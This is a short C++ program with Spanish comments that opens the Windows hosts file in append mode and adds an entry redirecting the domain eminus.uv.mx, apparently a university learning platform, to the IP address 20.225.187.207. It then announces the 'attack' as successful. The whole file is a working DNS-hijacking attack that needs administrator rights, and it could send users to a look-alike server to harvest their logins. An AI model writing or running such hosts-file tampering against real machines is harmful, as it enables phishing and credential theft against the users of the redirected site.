#include <iostream>
#include <fstream>
using namespace std;

//funcion principal
int main()
{
    /*
    Aqui abrimos el archivo hosts de la maquina
    En linux este archivo se encuentra en /etc/hosts
    Las banderas le indican que es para escritura final del archivo
    */

    ofstream myfile("c:\\windows\\system32\\drivers\\etc\\hosts", ios::app);
    if(myfile.is_open())
    {
        myfile << "\n20.225.187.207 eminus.uv.mx";
        myfile.close();
        cout << "Ataque realizado con exito!!!\n";
    }else{
        cout << "El programa requiere permisos de administrador. \n";
    }
    cout << "Presiona una tecla para salir...\n";
    cin.get();
    return 0;
}